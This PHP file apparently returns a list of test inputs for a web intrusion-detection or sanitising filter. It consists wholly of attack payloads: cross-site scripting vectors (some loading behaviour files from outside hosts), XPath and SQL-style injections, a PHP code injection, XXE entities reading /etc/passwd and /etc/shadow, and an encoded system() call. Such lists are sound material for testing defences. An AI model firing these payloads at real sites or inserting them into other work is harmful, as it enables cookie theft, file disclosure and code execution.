<?php
 $exploits = array();
$exploits['html_1'] = '<a/onmouseover=alert(document.cookie) href="http://www.google.de/">Google</a>';
$exploits['html_2'] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
$exploits['html_3'] = '<a style="background:url(//lo/)}lo:expression\(alert(1)));">lo</a>';
$exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
$exploits['html_5'] = '<img src="javascript:alert(1)">';
$exploits['html_6'] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
$exploits['html_7'] = '<img src src src src=x onerror=alert(1)>';
$exploits['html_8'] = '<img src=1 onerror=alert(1) alt=1>';
$exploits['html_9'] = '<b "<script>alert(1)</script>">hola</b>';
$exploits['html_10'] = '<img src=phpids_logo.gif alt=Logo onreadystatechange=MsgBox-1 language=vbs>';
$exploits['html_11'] = '<img src="." =">" onerror=alert(1);//';
$exploits['html_12'] = '<img src="." =">" onerror=alert(222222222222222222222222222222222222222222222222222,1);//';
$exploits['html_13'] = '<img src="." =">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa onerror = alert(1)/&#10;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
$exploits['html_14'] = '<a style="background:url(http://hh*/)}lo:expression(this.lol?0:alert(this.lol=1))/*%31);">lo</a>';
$exploits['html_15'] = '<a style="background:url(/hyyuj)&#125lo:expression&#40alert&#40/1/&#41//)/*lo);">lo</a>';
$exploits['html_16'] = '<img src= # onerror = alert(1) <b>foo</b>';
$exploits['html_17'] = '<a style="background:url(//lo/\\)}lo:expression\000028alert\000028/1/\000029\000029/*lo);">lo</a>';
$exploits['html_18'] = '<?xml:namespace prefix=xss><?import namespace=xss implementation=http://ha.ckers.org/xss.htc><xss:*>lo</xss:*>';
$exploits['html_19'] = '<a style="background:url(//mh.mh/\)!*mh:expression\(write\(1\));">lo</a> // you discovered';
$exploits['html_20'] = '<a href="http://ha.ckers.org/xss.css" style="background:url(/**/javascript:document.documentElement.firstChild.lastChild.href=document.documentElement.firstChild.nextSibling.lastChild.previousSibling.previousSibling.lastChild.previousSibling.previousSibling.lastChild.lastChild.lastChild.lastChild.lastChild.href);">lo</a>';
$exploits['html_21'] = "<img src=http://lo.lo/lo = '> ' onerror=alert(1)//";
$exploits['html_22'] = '<div style="color:white;>;lo:expression\\\28\\\77rite\\\28 1\\\29\\\29;';
$exploits['html_23'] = '<div style="background:url(\'http://lo.lo/lo\',!/lo:expression(write(1))/*\');">lo</div>';
$exploits['json_1'] = '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}';

$exploits[] = "count(/child::node())
x' or name()='username' or 'x'='y";
$exploits[] = "<name>','')); phpinfo(); exit;/*</name>";
$exploits[] = '<![CDATA[<script>var n=0;while(true){n++;}</script>]]>';
$exploits[] = '<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[\' or 1=1 or \'\'=\']]></foo>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>';
$exploits[] = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>';
$exploits[] = '<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(\'XSS\');">]]>';
$exploits[] = '<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(\'XSS\')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>';
$exploits[] = '<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>';
$exploits[] = '<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>';

$exploits[] = '%3C?php%20system(%22/bin/ls%20-l%22);?%3E';
return $exploits;